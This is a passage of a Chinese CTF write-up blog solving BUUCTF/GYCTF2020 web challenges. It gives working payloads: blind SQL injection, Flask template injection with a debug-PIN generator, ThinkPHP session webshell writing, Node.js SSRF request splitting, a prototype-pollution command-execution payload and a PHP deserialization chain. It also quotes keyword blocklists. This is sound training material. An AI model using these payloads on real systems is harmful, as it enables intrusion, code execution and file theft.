CLOSE来关闭打开的句柄。 11&#39;;handler &#96;FlagHere&#96; open;handler &#96;FlagHere&#96; read first;handler &#96;FlagHere&#96; close; 直接查到了flag。 [WEB]Ezsqli题目分析sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数： 发现and、or等函数都过滤了： 发现^没有过滤，采用^测试注入点： 12id&#x3D;1^0%23id&#x3D;1^1%23 返回错误 返回正确。 发现存在注入。 接下来就构造注入语句，因为过滤了or，所以无法使用information_schema 绕过函数： 12345sys.schema_auto_increment_columnssys.schema_table_statistics_with_buffersys.x$schema_table_statistics_with_buffersys.x$schema_flattened_keysjoin无列名注入 构造查表语句： 判断逻辑：返回Nu1L说明payload为1对，语句成立 返回Error Occured When Fetch Result payload为0，语句不成立 12查表名：id&#x3D;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;)^1 可见表名：f1ag_1s_h3r3_hhhhh 下面用无列名注入，利用到了ascii位偏移： 两个字符串比较时利用首字符的ascii码 核心payload：(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1) //子查询之间也可以直接通过&gt;、&lt;、=来进行判断。 测试字段： 123select 1select 1,2select 1,2,3 构造payload： 1id&#x3D;1^((select 1,&#39;f&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1 可见Nu1L页面的上一位就是我们要查询的值. Getflag 成功查询到flag。 [WEB]EasyThinking题目分析题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息： 猜测搜索处存在利用点。扫描目录发现存在www.zip，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本： 参考：https://paper.seebug.org/1114/ 参考：https://xz.aliyun.com/t/8409 TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径\\runtime\\session，文件名为32位就可以，构造后缀为.php的32位字符串，访问sess_+文件名 漏洞利用从注册的时候开始修改： 注册后search 页面 提交key，先写入&lt;?php phpinfo();?&gt; 然后访问看下：http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php 写入一句话，蚁剑连接发现执行不了命令，看下phpinfo： 发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass: [WEB]FlaskApp题目分析根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面： 查看源码发现提示PIN 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码： 可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。 漏洞利用采用if条件语句防止被过滤： 123456789&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9 可以得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;s_e_c_r_e_t_k_e_y&#x27;bootstrap = Bootstrap(app)class NameForm(FlaskForm): text = StringField(&#x27;BASE64加密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)class NameForm1(FlaskForm): text = StringField(&#x27;BASE64解密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1def hint(): txt = &quot;失败乃成功之母！！&quot; return render_template(&quot;hint.html&quot;,txt = txt)def encode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64encode(text.encode()) tmp = &quot;结果 :&#123;0&#125;&quot;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&#x27;encode&#x27;)) else : text = &quot;&quot; form = NameForm(text) return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;)def decode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for(&#x27;decode&#x27;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&#x27;decode&#x27;)) else : text = &quot;&quot; form = NameForm1(text) return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)def not_found(name): return render_template(&quot;404.html&quot;,name = name)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 1[&#39;SECRET_KEY&#39;] &#x3D; &#39;s_e_c_r_e_t_k_e_y&#39; 重点在waf： 123456def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1 可见过滤了命令执行常用函数，不能采用命令执行的方式。 继续读一下必要信息： 1234567891011121314username #读取&#x2F;etc&#x2F;passwd&#x2F;&#x2F;本题：flaskwebmodname #flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))为Flaskgetattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径&#x2F;&#x2F;本题通过报错得到路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.pyuuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式&#x2F;&#x2F;获取方式：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#x2F;&#x2F;本题：02:42:ac:10:af:49 转化为十进制(python print(0x0242ac10af49)) 2485377871689get_machine_id()&#x2F;&#x2F;读取&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值&#x2F;&#x2F;windows读取注册表：SOFTWARE\\\\Microsoft\\\\Cryptography&#x2F;&#x2F;docker下：&#x2F;proc&#x2F;self&#x2F;cgroup&#x2F;&#x2F;本题：0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*-coding:utf-8# From https://xz.aliyun.com/t/2553import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485377871689&#x27;,#str(uuid.getnode()), /sys/class/net/ens0/address &#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 信息修改完整后运行得到 pin码：410-898-797 读文件： 123import osos.listdir(&#x27;/&#x27;)os.popen(&#x27;cat /this_is_the_flag.txt&#x27;).readlines() 有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload： 1&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125; 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1], &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v1sun.github.io/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"}]},{"title":"BUUCTF-GYCTF2020","slug":"BUUCTF-GYCTF2020","date":"2021-04-19T13:10:00.000Z","updated":"2021-05-11T09:49:41.112Z","comments":true,"path":"2021/04/19/BUUCTF-GYCTF2020/","link":"","permalink":"https://v1sun.github.io/2021/04/19/BUUCTF-GYCTF2020/","excerpt":"","text":"BUUCTF-GYCTF2020[WEB]Node Game代码审计可以查看源码，代码审计： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128var express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;);var http = require(&#x27;http&#x27;);var pug = require(&#x27;pug&#x27;);var morgan = require(&#x27;morgan&#x27;);const multer = require(&#x27;multer&#x27;);app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));app.use(morgan(&#x27;short&#x27;));app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#x27;/template&#x27;)))app.get(&#x27;/&#x27;, function(req, res) &#123; var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file = path.join(__dirname + &#x27;/template/&#x27;+ action +&#x27;.pug&#x27;); var html = pug.renderFile(file); res.send(html);&#125;);app.post(&#x27;/file_upload&#x27;, function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: &#x27;&#x27;, &#125; if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123; obj.msg=&quot;only admin&#x27;s ip can use it&quot; res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; if(err)&#123; obj.msg = &#x27;upload failed&#x27;; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype +&quot;/&quot;; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = &quot;file type error&quot;; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: &#x27;upload success&#x27;, filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = &#x27;upload failed&#x27;; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get(&#x27;/source&#x27;, function(req, res) &#123; res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;);app.get(&#x27;/core&#x27;, function(req, res) &#123; var q = req.query.q; var resp = &quot;&quot;; if (q) &#123; var url = &#x27;http://localhost:8081/source?&#x27; + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding(&#x27;utf8&#x27;); resp.on(&#x27;error&#x27;, function(err) &#123; if (err.code === &quot;ECONNRESET&quot;) &#123; console.log(&quot;Timeout occurs&quot;); return; &#125; &#125;); resp.on(&#x27;data&#x27;, function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(&quot;search param &#x27;q&#x27; missing!&quot;); &#125;&#125;)function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;) 通过审计发现存在以下功能： 1234&#39;&#x2F;&#39; &#x2F;&#x2F;indexpost &#x2F;file_upload &#x2F;&#x2F;文件上传get &#x2F;source &#x2F;&#x2F;查看源码get &#x2F;core &#x2F;&#x2F;存在SSRF 漏洞分析核心代码分析： get /core 存在SSRF，对我们传入的q参数进行拼接： 1url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q 然后通过blacklist函数进行验证，blacklist函数： 12345678910function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125; 对敏感函数进行了过滤。 post /file_upload 是个文件上传的地方，需要满足以下条件： 1ip.includes(&#39;127.0.0.1&#39;) 首页还存在提示： 存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。 提示了pug，同时模板渲染采用的是pug引擎： 看一下 pug 引擎文档： 从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。 1234567//- index.pugdoctype htmlhtml head style include style.css 思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。 漏洞利用构造post请求，采用抓包的方法获取上传请求： 直接上传会提示： 构造exp：利用nodejs ssrf构造post请求 1234567891011121314151617181920212223242526272829303132333435363738394041#-*-coding:utf-8import urllib.parseimport requestspayload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: keep-aliveContent-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------303312354614442Content-Length: 317-----------------------------303312354614442Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;v1sun.pug&quot;Content-Type: &#x2F;..&#x2F;template&#x2F;&#x2F;- v1sun.pugdoctype htmlhtml head style include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt -----------------------------303312354614442--GET &#x2F;flag HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39;payload &#x3D; payload.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)#print(payload)#print (urllib.parse.quote(payload))r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn&#x2F;core?q&#x3D;&#39;+ urllib.parse.quote(payload))print(r.text) Content-Type处存在一个小trick，利用nodejs的目录穿越，上传到模板目录： 1Content-Type: &#x2F;..&#x2F;template 同时要修改：Connection: keep-alive 以至于让我们的所有请求包含进去 上传后访问：?action=v1sun 查看源码就得到flag [WEB]Ez_Express题目分析 但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456 下载源码 代码审计审计发现是nodejs：app.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var createError = require(&#x27;http-errors&#x27;);var express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);var cookieParser = require(&#x27;cookie-parser&#x27;);var logger = require(&#x27;morgan&#x27;);const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)var indexRouter = require(&#x27;./routes/index&#x27;);var app = express();// view engine setupapp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.disable(&#x27;etag&#x27;);app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(session(&#123; name: &#x27;session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.use(logger(&#x27;dev&#x27;));app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.use(&#x27;/&#x27;, indexRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(&#x27;env&#x27;) === &#x27;development&#x27; ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render(&#x27;error&#x27;);&#125;);module.exports = app; app.js没什么特别关注的点。 index.js： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123; if(!req.session.user)&#123; res.redirect(&#x27;/login&#x27;); &#125; res.outputFunctionName=undefined; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123; res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123; if(req.body.Submit==&quot;register&quot;)&#123; if(safeKeyword(req.body.userid))&#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user=&#123; &#x27;user&#x27;:req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;:false &#125; res.redirect(&#x27;/&#x27;); &#125; else if(req.body.Submit==&quot;login&quot;)&#123; if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123; if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;)module.exports = router; 看到了js原型链污染漏洞的标志性函数：merge 应该就是原型链污染了。 但是看到： ADMIN用户才可以触发clone 进而利用merge。但是限制了admin注册，看下注册登陆处： 注册处会有验证，但是后边写入session的时候会经过toUpperCase()函数的处理，不由得想到了nodejs的大小写转换特性： 对于toUpperCase(): 1字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot; 对于toLowerCase(): 1字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K) 在绕一些规则的时候就可以利用这几个特殊字符进行绕过 漏洞利用可见我们要想得到ADMIN 可以注册admın 经过处理就得到ADMIN： 成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在outputFunctionName，并且res.outputFunctionName=undefined;在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问： 12Content-Type: application&#x2F;json&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag&#39;);var _tmp2&quot;&#125;&#125; 路径通过报错得到： 然后访问/flag 得到flag。 [WEB]Easyphp题目分析扫描目录发现： 存在备份文件，下载代码审计： admin 进入update页面 可得到flag 查看是否存在注入： 存在预处理，因此无法注入 查询的sql语句为： 1select id,password from user where username&#x3D;? 查询admin用户的密码，密码和数据库相等则登陆成功。 通过控制执行的语句即可绕过登录admin： 12select id,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;? &#x2F;&#x2F;&quot;202cb962ac59075b964b07152d234b70&quot;为123的MD5，密码输入123即可 接下来就是利用反序列化漏洞，构造pop链去执行sql语句： 1UpdateHelper类在结束时 会echo 调用魔术方法 1触发User的__toString()方法 1调用Info的__call()方法 1__call 方法调用了login 这里可以： 12$this-&gt;CtrlCase 为dbCtrl类login参数为：$this-&gt;age传进来的 pop 链： 1UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125; 寻找反序列化入口： update页面会调用update方法： 可见$_POST[&#39;age&#39;]与$_POST[&#39;nickname&#39;]可控，传入Info类实例化，然后反序列化，再经过safe函数处理。 可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸： 可见是一个字符增加的字符串逃逸。 漏洞利用Info()类正常序列化： 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;testage&quot;;s:8:&quot;nickname&quot;;s:8:&quot;testname&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下： 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:265:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为： 1unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 序列化一下并用safe函数处理： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1590:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerh